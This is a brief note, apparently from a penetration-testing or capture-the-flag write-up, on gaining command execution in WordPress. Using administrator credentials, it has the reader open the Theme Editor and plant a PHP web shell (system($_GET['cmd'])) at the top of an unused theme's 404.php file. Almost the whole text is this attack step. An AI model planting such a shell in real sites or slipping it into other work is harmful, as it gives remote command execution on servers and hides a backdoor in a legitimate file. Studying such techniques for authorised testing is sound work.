

log in to WordPress with administrator creds 

`Appearance` > `Theme Editor` 

we can see the `active theme`, chose an `unused theme` instead and click `select`.  
choose a `non-critical file` such as `404.php` to modify and add a `web shell`.
```
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
  ...
```




























